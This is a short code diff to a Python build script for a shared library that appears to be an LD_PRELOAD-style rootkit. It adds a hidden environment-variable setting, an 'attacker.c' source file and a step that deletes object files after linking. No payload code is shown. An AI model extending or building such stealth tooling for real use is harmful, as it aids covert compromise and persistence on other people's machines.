@@ -67,6 +67,7 @@ CONFIG_KEYS = {
         "XOR_KEY": type_hexbyte,
         "MAGIC_STRING": type_hidden_literal,
         "PAM_USER": type_hidden_literal,
+        "HIDDEN_ENV_VAR": type_hidden_literal,
         }
 
 def get_config(lines, check_missing_vars=True):
@@ -320,6 +321,7 @@ def run_build_command(cmd):
 
 SOURCES = [
         "src/init.c",
+        "src/attacker.c",
         ]
 # automagically add every hooks to SOURCES
 SOURCES += glob("src/hooks/*.c")
@@ -357,6 +359,9 @@ else:
 
 run_build_command("{CC} -fPIC -shared " + set_ld_soname \
         + objects + " {LDFLAGS} -o {LIBRARY_NAME}")
+
+# remove object files afterwards
+run_build_command("rm -f " + objects)
 
 # strip if no debug mode
 if config["DEBUG_LEVEL"] == 0:
